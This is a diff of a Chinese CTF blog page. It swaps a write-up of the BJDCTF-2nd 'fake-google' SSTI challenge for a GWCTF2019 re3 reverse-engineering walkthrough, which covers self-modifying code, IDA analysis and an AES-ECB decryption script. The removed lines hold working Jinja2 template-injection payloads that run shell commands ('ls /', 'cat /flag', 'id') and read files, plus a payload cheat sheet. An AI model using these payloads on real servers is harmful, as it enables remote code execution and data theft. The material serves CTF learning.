@@ -22,26 +22,27 @@
     var CONFIG = {"hostname":"4chan123.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="0X01 打开靶机  发现无论输入什么字符他都不会过滤（xss除外 ），在输出界面找到ssti注入的提示  0X02 直接用ssti日就对了！🤠  查看根目录  12&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__&#x3D;&#x3D;&amp;#x27;catch_warnings&amp;#x27; %&amp;#">
+  <meta name="description" content="链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1lZr8Cqf8FOuwOU-x2J3yVQ 提取码：myh6 知识点总结： ​ 🚦 AES逆向加密 ECB模式 平均分组 每组互不干扰 CBC模式 平均分组 改明文和前一个密文异或之后再进行加密 所以需要一个初始化数组对第一组异或 一般来说AES加密前会调用一个函数对密匙进行拓展 然后才会处理明 0X01 查看有无加壳  🍖  没有加壳">
 <meta property="og:type" content="article">
-<meta property="og:title" content="BJDCTF-2nd-fake-google">
-<meta property="og:url" content="https://4chan123.github.io/2021/04/06/BJDCTF-2nd-fake-google/index.html">
+<meta property="og:title" content="GWCTF2019re3">
+<meta property="og:url" content="https://4chan123.github.io/2021/04/26/GWCTF2019re3/index.html">
 <meta property="og:site_name" content="4chan">
-<meta property="og:description" content="0X01 打开靶机  发现无论输入什么字符他都不会过滤（xss除外 ），在输出界面找到ssti注入的提示  0X02 直接用ssti日就对了！🤠  查看根目录  12&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__&#x3D;&#x3D;&amp;#x27;catch_warnings&amp;#x27; %&amp;#">
+<meta property="og:description" content="链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1lZr8Cqf8FOuwOU-x2J3yVQ 提取码：myh6 知识点总结： ​ 🚦 AES逆向加密 ECB模式 平均分组 每组互不干扰 CBC模式 平均分组 改明文和前一个密文异或之后再进行加密 所以需要一个初始化数组对第一组异或 一般来说AES加密前会调用一个函数对密匙进行拓展 然后才会处理明 0X01 查看有无加壳  🍖  没有加壳">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://4chan123.github.io/.io//0.png">
 <meta property="og:image" content="https://4chan123.github.io/.io//1.png">
 <meta property="og:image" content="https://4chan123.github.io/.io//3.png">
 <meta property="og:image" content="https://4chan123.github.io/.io//4.png">
-<meta property="article:published_time" content="2021-04-06T14:34:05.000Z">
-<meta property="article:modified_time" content="2021-04-14T06:01:24.312Z">
+<meta property="og:image" content="https://4chan123.github.io/.io//5.png">
+<meta property="article:published_time" content="2021-04-26T06:33:25.000Z">
+<meta property="article:modified_time" content="2021-04-26T11:17:36.949Z">
 <meta property="article:author" content="4Chan">
-<meta property="article:tag" content="WEB">
 <meta property="article:tag" content="CTF">
-<meta property="article:tag" content="SSTI注入">
+<meta property="article:tag" content="逆向反加密">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://4chan123.github.io/.io//1.png">
+<meta name="twitter:image" content="https://4chan123.github.io/.io//0.png">
 
-<link rel="canonical" href="https://4chan123.github.io/2021/04/06/BJDCTF-2nd-fake-google/">
+<link rel="canonical" href="https://4chan123.github.io/2021/04/26/GWCTF2019re3/">
 
 
 <script id="page-configurations">
@@ -54,7 +55,7 @@
   };
 </script>
 
-  <title>BJDCTF-2nd-fake-google | 4chan</title>
+  <title>GWCTF2019re3 | 4chan</title>
   
 
 
@@ -214,7 +215,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://4chan123.github.io/2021/04/06/BJDCTF-2nd-fake-google/">
+    <link itemprop="mainEntityOfPage" href="https://4chan123.github.io/2021/04/26/GWCTF2019re3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -227,7 +228,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          BJDCTF-2nd-fake-google
+          GWCTF2019re3
         </h1>
 
         <div class="post-meta">
@@ -236,23 +237,17 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2021-04-06 22:34:05" itemprop="dateCreated datePublished" datetime="2021-04-06T22:34:05+08:00">2021-04-06</time>
+              <time title="创建时间：2021-04-26 14:33:25 / 修改时间：19:17:36" itemprop="dateCreated datePublished" datetime="2021-04-26T14:33:25+08:00">2021-04-26</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-04-14 14:01:24" itemprop="dateModified" datetime="2021-04-14T14:01:24+08:00">2021-04-14</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
+                  <a href="/categories/RE/" itemprop="url" rel="index"><span itemprop="name">RE</span></a>
                 </span>
             </span>
 
@@ -272,8 +267,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2021/04/06/BJDCTF-2nd-fake-google/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/04/06/BJDCTF-2nd-fake-google/" itemprop="commentCount"></span>
+    <a title="valine" href="/2021/04/26/GWCTF2019re3/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/04/26/GWCTF2019re3/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -288,32 +283,43 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1>0X01 <strong>打开靶机</strong></h1>
+        <p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1lZr8Cqf8FOuwOU-x2J3yVQ">https://pan.baidu.com/s/1lZr8Cqf8FOuwOU-x2J3yVQ</a><br>
+提取码：myh6</p>
+<h2 id="知识点总结：-​-🚦">知识点总结： ​ 🚦</h2>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhangmiaoping23/article/details/8949290">AES逆向加密</a></p>
+<p>ECB模式 平均分组 每组互不干扰</p>
+<p>CBC模式 平均分组 改明文和前一个密文异或之后再进行加密 所以需要一个初始化数组对第一组异或</p>
+<p>一般来说AES加密前会调用一个函数对密匙进行拓展 然后才会处理明</p>
+<h2 id="0X01-查看有无加壳-🍖"><strong>0X01 查看有无加壳</strong>  🍖</h2>
+<p><img src="/.io//0.png" alt="0"></p>
+<p>没有加壳，64位文件</p>
+<h2 id="0x02-使用IDA64打开文件-🔑"><strong>0x02 使用IDA64打开文件</strong> 🔑</h2>
+<ul>
+<li>找到main函数, <strong>F5</strong> 反编译，进行代码分析</li>
+</ul>
 <p><img src="/.io//1.png" alt="1"></p>
-<p>发现无论输入什么字符他都不会过滤（xss除外 ），在输出界面找到ssti注入的提示</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+8h] [bp-48h]@4</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+20h] [bp-30h]@1</span></span><br><span class="line">  __int64 v5; <span class="comment">// [sp+48h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v5 = *MK_FP(__FS__, <span class="number">40LL</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%39s&quot;</span>, &amp;s, a3);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(&amp;s) != <span class="number">32</span> ) <span class="comment">//输入的长度为32</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  mprotect((<span class="keyword">void</span> *)<span class="number">0x400000</span>, <span class="number">0xF000</span>uLL, <span class="number">7</span>);  <span class="comment">//修改文件为可读可执行</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">223</span>; ++i )  <span class="comment">//SMC自修改代码，异或0x99</span></span><br><span class="line">    *((_BYTE *)sub_402219 + i) ^= <span class="number">0x99</span>u;</span><br><span class="line">  sub_40207B(&amp;unk_603170, <span class="number">61440LL</span>);</span><br><span class="line">  sub_402219();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>sub_4022190函数有异或，我们查看</li>
+</ul>
 <p><img src="/.io//3.png" alt="3"></p>
-<h1><strong>0X02 直接用ssti日就对了！🤠</strong></h1>
 <ul>
-<li><em>查看根目录</em></li>
+<li>选中后我们按  <strong><code>C</code></strong> 强制（ <strong><code>Force</code></strong> ）分析代码</li>
 </ul>
-<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p><img src="/.io//4.png" alt="4"></p>
-<p>ls后台文件出现flag</p>
+<p>使用Findecrypt插件查看一下加密算法发现很多加密</p>
 <ul>
-<li><em>构造playload，查看flag</em></li>
+<li>我们查看sub_40207B()函数</li>
 </ul>
-<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P3<span class="string">&#x27;s girlfirend is : flag&#123;4d59689e-7751-4ee4-8daa-f4d8c8de99e2&#125;</span></span><br></pre></td></tr></table></figure>
-<h1><strong>SSTI学习🇭🇺</strong></h1>
-<p>像上面的题目的套路一般直接找playload注入</p>
-<ul>
-<li>
-<h2 id="常用playload">常用playload:</h2>
-</li>
-</ul>
-<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">命令执行：&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; </span><br><span class="line"></span><br><span class="line">文件操作：&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="萌新入门ssti必看"><em>萌新入门ssti必看</em></h2>
-<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">测试是否存在ssti注入 &#123;&#123;<span class="number">1</span>+<span class="number">1</span>&#125;&#125;  <span class="meta">#回复页面为2说明存在ssti注入</span></span><br><span class="line">查询： &#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__&#125;&#125; </span><br><span class="line">查看可用模块： &#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()&#125;&#125; </span><br><span class="line">查找危险函数： &#123;&#123;().__class__.base__.__subclasses__().index(warnings.catch_warnings)&#125;&#125;</span><br><span class="line"></span><br><span class="line">相关函数解释</span><br><span class="line">__class__ 返回类型所属的对象</span><br><span class="line"></span><br><span class="line">__subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line"></span><br><span class="line">__init__ 类的初始化方法</span><br><span class="line"></span><br><span class="line">__globals__ 对包含函数全局变量的字典的引用</span><br><span class="line"></span><br><span class="line">__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line"></span><br><span class="line">__bases__ 返回该对象所继承的基类 __builtins__是做为默认初始模块</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/.io//5.png" alt="5"></p>
+<p>MD5加密，第10行和14行的MD5加密有用<br>
+内容大体将base64密码表进行两次sub_401CF9加密然后赋值给参数a1<br>
+这里没有用到用户输入，可以动调一下获得加密后的a1<br>
+IDA先在sub_40207B()函数执行后一条下断点</p>
+<h2 id="0x03-写个脚本做循环对比就行了-​-🎅">**0x03  写个脚本做循环对比就行了 ** ​ 🎅</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;so.in&#x27;</span>)</span><br><span class="line">a = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    s = f.readline()</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        a += <span class="built_in">chr</span>(<span class="built_in">int</span>(s[j*<span class="number">3</span>:j*<span class="number">3</span>+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">b = <span class="string">&#x27;&#x27;</span></span><br><span class="line">s = f.readline()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    b += <span class="built_in">chr</span>(<span class="built_in">int</span>(s[j*<span class="number">3</span>:j*<span class="number">3</span>+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span> a,b</span><br><span class="line">_aes = AES.new(b,mode = AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span> _aes.decrypt(a)</span><br></pre></td></tr></table></figure>
+<p>so.in内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BC 0A AD C0 14 7C 5E CC E0 B1 40 BC 9C 51 D5 2B</span><br><span class="line">46 B2 B9 43 4D E5 32 4B AD 7F B4 B3 9C DB 4B 5B</span><br><span class="line">CB 8D 49 35 21 B4 7A 4C C1 AE 7E 62 22 92 66 CE</span><br></pre></td></tr></table></figure>
 
     </div>
 
@@ -342,9 +348,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/WEB/" rel="tag"><i class="fa fa-tag"></i> WEB</a>
               <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
-              <a href="/tags/SSTI%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fa fa-tag"></i> SSTI注入</a>
+              <a href="/tags/%E9%80%86%E5%90%91%E5%8F%8D%E5%8A%A0%E5%AF%86/" rel="tag"><i class="fa fa-tag"></i> 逆向反加密</a>
           </div>
 
         
@@ -353,13 +358,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/" rel="prev" title="CISCN2019-华东南赛区-Double-Secret">
-      <i class="fa fa-chevron-left"></i> CISCN2019-华东南赛区-Double-Secret
+    <a href="/2021/04/22/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8Bpython%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%94%E5%A4%A9/" rel="prev" title="从零开始python学习第五天">
+      <i class="fa fa-chevron-left"></i> 从零开始python学习第五天
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2021/04/08/GXYCTF2019-luck-guy/" rel="next" title="GXYCTF2019 luck_guy">
-      GXYCTF2019 luck_guy <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -419,7 +421,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">0X01 打开靶机</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">0X02 直接用ssti日就对了！🤠</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">SSTI学习🇭🇺</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8playload"><span class="nav-number">3.1.</span> <span class="nav-text">常用playload:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%90%8C%E6%96%B0%E5%85%A5%E9%97%A8ssti%E5%BF%85%E7%9C%8B"><span class="nav-number">3.2.</span> <span class="nav-text">萌新入门ssti必看</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%EF%BC%9A-%E2%80%8B-%F0%9F%9A%A6"><span class="nav-number">1.</span> <span class="nav-text">知识点总结： ​ 🚦</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X01-%E6%9F%A5%E7%9C%8B%E6%9C%89%E6%97%A0%E5%8A%A0%E5%A3%B3-%F0%9F%8D%96"><span class="nav-number">2.</span> <span class="nav-text">0X01 查看有无加壳  🍖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E4%BD%BF%E7%94%A8IDA64%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6-%F0%9F%94%91"><span class="nav-number">3.</span> <span class="nav-text">0x02 使用IDA64打开文件 🔑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%86%99%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%81%9A%E5%BE%AA%E7%8E%AF%E5%AF%B9%E6%AF%94%E5%B0%B1%E8%A1%8C%E4%BA%86-%E2%80%8B-%F0%9F%8E%85"><span class="nav-number">4.</span> <span class="nav-text">**0x03  写个脚本做循环对比就行了 ** ​ 🎅</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
